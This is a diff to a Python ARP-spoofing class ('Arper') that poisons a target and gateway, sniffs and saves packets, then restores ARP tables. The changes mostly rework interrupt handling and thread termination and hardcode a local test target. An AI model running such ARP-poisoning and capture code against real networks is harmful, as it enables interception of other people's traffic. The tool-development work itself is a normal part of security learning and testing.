@@ -42,11 +42,6 @@ class Arper:
             self.sniff_thread.terminate() ###
             sys.exit()
 
-        except KeyboardInterrupt:
-            self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ###
-            sys.exit()
-
     def poison(self):
         
         poison_target = ARP()
@@ -86,11 +81,6 @@ class Arper:
                 print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
                 sys.exit()
 
-            except KeyboardInterrupt:
-                print('Test: exiting poison func to enter restore func...') ### testing
-                self.restore()
-                sys.exit() ###
-
     def sniff(self, count=100):
 
         try:
@@ -112,19 +102,17 @@ class Arper:
         except Exception as e:
             print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
             sys.exit()
-
-        except KeyboardInterrupt:
-            sys.exit()
         
         else:
             wrpcap(filename, packets)
             print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Packets captured and saved in {Fore.GREEN}{filename}{Style.RESET_ALL}.')
             self.restore()
             print(f'[{Fore.GREEN}+{Style.RESET_ALL}] Sniffing finnished succesfully.')
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ###
             
 
     def restore(self):
-
 
         print('Test: entered restore func succesflly') ### testing
 
@@ -138,11 +126,10 @@ class Arper:
             print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
             sys.exit()
 
-        except KeyboardInterrupt:
-            sys.exit()
-
         else:
             print(f'[{Fore.GREEN}+{Style.RESET_ALL}] ARP tables restored.')
+            self.poison_thread.terminate() ###
+            self.sniff_thread.terminate() ###
 
 def arpspoof(target, gateway, iface):
 
@@ -150,7 +137,5 @@ def arpspoof(target, gateway, iface):
     arp.run()
 
 if __name__ == '__main__': # for test
-    try:
-        arpspoof('192.168.1.2', '192.168.1.1', 'wlp1s0')
-    except KeyboardInterrupt:
-        sys.exit()
+    arpspoof('192.168.1.2', '192.168.1.1', 'wlp1s0')
+    
